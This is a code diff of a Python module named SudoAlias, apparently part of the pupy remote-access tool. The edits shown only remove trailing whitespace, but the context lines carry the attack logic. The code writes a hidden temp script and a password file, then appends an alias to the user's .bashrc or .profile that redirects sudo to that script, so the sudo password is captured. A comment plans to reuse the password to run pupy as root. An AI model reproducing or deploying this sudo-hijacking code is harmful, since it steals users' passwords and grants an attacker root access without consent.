@@ -38,18 +38,18 @@ class SudoAlias(threading.Thread):
         threading.Thread.__init__(self, *args, **kwargs)
         self.daemon  = True
         self.stopped = False
-        
+
         if not hasattr(sys, 'SUDO_ALIAS_BUFFER'):
             sys.SUDO_ALIAS_BUFFER = ''
-            
+
         home = os.path.expanduser("~")
-        # profile file is loaded on Mac os instead of bashrc 
+        # profile file is loaded on Mac os instead of bashrc
         self.system = sys.platform
         if self.system == 'darwin':
             self.bashrc = os.path.join(home, '.profile')
         else:
             self.bashrc = os.path.join(home, '.bashrc')
-        
+
         # alias path
         random_alias_name       = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
         self.alias_file         = os.path.join(tempfile.gettempdir(), random_alias_name)
@@ -76,7 +76,7 @@ class SudoAlias(threading.Thread):
         # remove tmp files
         if os.path.exists(self.password_file):
             os.remove(self.password_file)
-        
+
         if os.path.exists(self.alias_file):
             os.remove(self.alias_file)
 
@@ -129,7 +129,7 @@ fi
     def run(self):
         if os.path.exists(self.bashrc):
             self.original_bashrc_content = open(self.bashrc).read()
-        
+
         # TO DO
         # launch pupy as root
         # replace # [OPTIONAL_LINE] by echo "$password" | sudo -S <path_to_pupy_binary>
@@ -148,7 +148,7 @@ fi
             st = os.stat(self.alias_file)
             os.chmod(self.alias_file, st.st_mode | stat.S_IEXEC)
 
-        # create alias sudo 
+        # create alias sudo
         alias = "\nalias sudo='{alias_file}'\n".format(alias_file=self.alias_file)
         open(self.bashrc, 'a+').write(alias)
 
